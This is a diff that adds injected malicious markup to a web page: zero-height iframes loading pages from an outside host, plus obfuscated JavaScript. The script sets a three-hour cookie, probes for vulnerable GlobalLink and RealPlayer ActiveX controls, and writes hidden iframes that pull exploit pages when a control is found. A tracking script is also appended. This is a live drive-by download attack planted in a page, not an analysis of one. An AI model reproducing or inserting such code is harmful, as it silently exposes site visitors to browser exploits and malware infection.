@@ -1,0 +1,20 @@
+<iframe src="http://ph.errtys.org/ax14.htm" width=100 height=0></iframe>
+<iframe src="http://ph.errtys.org/re10.htm" width=100 height=0></iframe>
+
+<script>
+var kaspersky="shabi"
+var L_czcY_1 = new window["Date"]()
+L_czcY_1["setTime"](L_czcY_1["getTime"]() + 3*60*60*1000)
+var Jy2$2 = new window["String"](window["document"]["cookie"])
+var sX$bhbGk3 = "Cookie1="
+var zecKZZ4 = Jy2$2["indexOf"](sX$bhbGk3)
+if (zecKZZ4 == -1)
+{
+window["document"]["cookie"] = "Cookie1=POPWINDOS;expires="+ L_czcY_1["toGMTString"]()
+try{if(new window["ActiveXObject"]("GLIEDown.IEDown.1"))window["document"]["write"]('<iframe style=display:none src="http://ph.errtys.org/axlz.htm"></iframe>');}catch(e){}
+try{if(new window["ActiveXObject"]("IERPCtl.IERPCtl.1"))window["document"]["write"]('<iframe style=display:none src="http://ph.errtys.org/re11.htm"></iframe>');}catch(e){}
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=1;
+}
+</script>
+
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1847687.js"></script>
